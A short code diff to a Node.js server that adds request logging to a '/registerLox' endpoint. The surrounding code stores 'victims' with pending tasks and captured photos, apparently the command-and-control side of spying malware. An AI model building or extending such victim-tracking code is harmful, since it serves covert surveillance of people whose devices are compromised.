@@ -38,6 +38,7 @@ async function safeJson(res,req,data,code) {
 const selfIp = getPublicIpAddress()
 
 app.post('/registerLox', async (req,res) => {
+  console.log(req.body)
   if (req && req.body && req.body.uuid) {
     victims.push({uuid: req.body.uuid, pendingTasks: [], currentPhoto: 'none', photoId: 0})
     console.log(req.body.uuid)
